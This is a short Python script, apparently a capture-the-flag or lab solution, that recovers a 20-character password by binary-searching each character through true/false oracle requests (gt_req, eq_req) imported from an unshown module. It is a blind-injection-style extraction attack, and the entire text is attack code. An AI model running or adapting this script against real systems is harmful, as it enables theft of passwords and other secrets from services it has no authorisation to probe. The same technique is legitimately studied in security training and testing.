from funcs import *

password = ""
for i in range(1, 21):
    os = 32 #first typed character's ascii which is ' ' (space)
    oe = 126 #last typed character's ascii which is '~'rc
    count = 1
    while os <= oe:
        print("trying... #"+str(count))
        m = (os + oe) // 2
        c = chr(m)

        if gt_req(i, c):
            os = m + 1
        else:
            oe = m - 1
        print("out", os, oe)
        count = count + 1
    c = chr(os)
    if oe != os and eq_req(i, chr(oe)):
        c = chr(oe)
    print("found!", c)
    password = password + c

print("password:", password)